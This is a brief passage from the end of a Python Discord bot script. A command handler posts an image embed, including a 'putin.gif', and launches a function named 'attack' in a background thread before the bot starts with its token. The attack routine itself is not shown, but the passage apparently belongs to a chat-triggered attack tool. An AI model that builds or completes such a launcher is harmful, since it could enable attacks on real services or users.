        url='https://cdn.discordapp.com/attachments/928588202313400320/937842593570623508/putin.gif')
    embed.set_image(url=f'https://media.giphy.com/media/ilybm4KzwjwQAap0gy/giphy.gif')
    embed.set_footer(text="")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)




client.run(token)
